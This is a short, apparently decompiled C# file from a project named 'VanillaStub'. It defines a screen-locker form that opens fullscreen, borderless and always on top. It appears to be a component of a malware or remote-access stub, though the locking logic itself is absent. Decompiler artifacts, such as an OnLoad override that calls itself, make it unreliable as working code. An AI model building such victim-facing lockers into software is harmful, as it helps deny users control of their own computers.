using System;
using System.Drawing;
using System.Windows.Forms;

namespace VanillaStub;

public class IScreenLocker : Form
{
	protected override void OnLoad(EventArgs e)
	{
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).set_TopMost(true);
		((Form)this).OnLoad(e);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((Form)this).set_ClientSize(new Size(284, 261));
		((Control)this).set_Name("IScreenLocker");
		((Form)this).add_Load((EventHandler)IScreenLocker_Load);
		((Control)this).ResumeLayout(false);
	}

	private void IScreenLocker_Load(object sender, EventArgs e)
	{
	}
}
